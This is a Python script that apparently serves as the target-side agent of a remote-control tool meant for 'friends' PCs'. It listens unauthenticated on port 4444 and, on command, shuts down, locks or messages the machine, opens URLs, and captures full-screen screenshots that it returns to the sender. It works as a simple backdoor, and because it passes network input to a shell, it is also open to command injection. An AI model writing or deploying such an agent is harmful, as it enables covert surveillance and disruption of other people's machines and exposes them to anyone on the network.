"""
agent.py — runs on the TARGET machines (your friends' PCs)
python agent.py
listens on port 4444 for commands from server.py
"""

import socket, json, subprocess, os, threading, sys

PORT = 4444

def handle(action, data):
    if action == "shutdown":
        subprocess.Popen(["shutdown", "/s", "/t", "5"])
        return {"status": "ok", "msg": "Shutting down in 5s"}

    elif action == "message":
        subprocess.Popen([
            "msg", "*", data or "Hello from Mohamed!"
        ], shell=True)
        return {"status": "ok", "msg": "Message sent"}

    elif action == "lockscreen":
        subprocess.Popen(["rundll32.exe", "user32.dll,LockWorkStation"])
        return {"status": "ok", "msg": "Screen locked"}

    elif action == "openurl":
        url = data or "https://www.youtube.com"
        os.startfile(url)
        return {"status": "ok", "msg": f"Opened {url}"}

    elif action == "screenshot":
        try:
            import mss, base64, io
            with mss.mss() as s:
                img = s.grab(s.monitors[0])
                buf = io.BytesIO()
                from PIL import Image
                Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(buf, "JPEG", quality=40)
                b64 = base64.b64encode(buf.getvalue()).decode()
                return {"status": "ok", "data": b64}
        except Exception as e:
            return {"status": "error", "msg": str(e)}

    elif action == "remote":
        return {"status": "ok", "msg": "Remote view: use RDP (mstsc) or VNC for live screen"}

    else:
        return {"status": "error", "msg": f"Unknown action: {action}"}

def client_thread(conn, addr):
    try:
        data = conn.recv(4096).decode()
        payload = json.loads(data)
        action = payload.get("action","")
        d = payload.get("data","")
        print(f"[<] {action} from {addr[0]}")
        result = handle(action, d)
        conn.sendall(json.dumps(result).encode())
    except Exception as e:
        conn.sendall(json.dumps({"status":"error","msg":str(e)}).encode())
    finally:
        conn.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(10)
    print(f"[*] Agent listening on port {PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=client_thread, args=(conn,addr), daemon=True).start()

if __name__ == "__main__":
    main()
